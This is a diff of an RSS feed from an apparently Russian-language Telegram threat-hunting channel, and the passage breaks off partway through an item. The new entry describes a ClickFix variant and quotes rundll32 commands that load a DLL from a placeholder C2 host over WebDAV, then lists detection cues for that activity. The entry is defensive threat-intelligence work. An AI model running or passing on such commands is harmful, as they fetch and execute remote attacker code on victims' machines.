@@ -1,5 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Mon, 23 Mar 2026 16:56:43 +0000</lastBuildDate><item><title>https://drivershield.io/</title><link>https://t.me/ThreatHuntingFather/1247</link><description>https://drivershield.io/
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Tue, 24 Mar 2026 19:29:36 +0000</lastBuildDate><item><title>The ClickFix Evolution: New Variant Replaces PowerShell with Rundll32 and WebDAV</title><link>https://t.me/ThreatHuntingFather/1248</link><description>The ClickFix Evolution: New Variant Replaces PowerShell with Rundll32 and WebDAV
+Мы любим кликфиксы и смотрим за развитием этой техники😁
+The commands observed during analysis:
+rundll32.exe \\ С2@80\verification.google,#1
+rundll32.exe \\С2@80\verification.google,#1
+rundll32.exe \\ С2@80\verification[.]google,#1
+Detection Logic
+This activity presents multiple detection opportunities across endpoint and network telemetry:
+Execution of rundll32.exe with davclnt.dll,DavSetCookie
+Use of @80 WebDAV syntax in command-line arguments
+Outbound HTTP connections initiated by rundll32.exe
+Subsequent execution of scripting engines (PowerShell, mshta)
+Access to suspicious external domains or IP addresses
+Почитать тут, ну и там про детектирование тоже написано 🔗https://www.cyberproof.com/blog/the-clickfix-evolution-new-variant-replaces-powershell-with-rundll32-and-webdav/
+
+[Media: Фото]</description><pubDate>Tue, 24 Mar 2026 19:29:36 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1248</guid></item><item><title>https://drivershield.io/</title><link>https://t.me/ThreatHuntingFather/1247</link><description>https://drivershield.io/
 Developed by Tolga SEZER</description><pubDate>Mon, 23 Mar 2026 16:56:43 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1247</guid></item><item><title>Unit 42 опубликовали разбор кластера CL-UNK-1068(Chinese APT~), работают по Азии с 2020 года. Авиация, энергетика, телеком, госсектор.</title><link>https://t.me/ThreatHuntingFather/1239</link><description>Unit 42 опубликовали разбор кластера CL-UNK-1068(Chinese APT~), работают по Азии с 2020 года. Авиация, энергетика, телеком, госсектор.
 APT не вкладывается в разработку инструментария, а просто использовала то что есть в открытых источниках?Ну а что, работает же 😃
 Инструменты (указанные в отчете)
